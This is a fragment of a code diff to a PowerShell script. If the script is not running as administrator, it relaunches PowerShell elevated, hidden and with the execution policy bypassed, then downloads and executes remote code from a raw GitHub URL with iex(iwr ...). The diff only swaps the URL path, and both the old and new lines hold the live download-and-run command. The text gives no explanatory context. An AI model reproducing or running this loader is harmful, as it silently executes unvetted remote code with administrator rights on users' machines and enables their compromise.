@@ -28,7 +28,7 @@ public class WindowHelper
 # Run as Administrator
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
-    $newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0-wp' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
+    $newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
     exit;
 }
 else
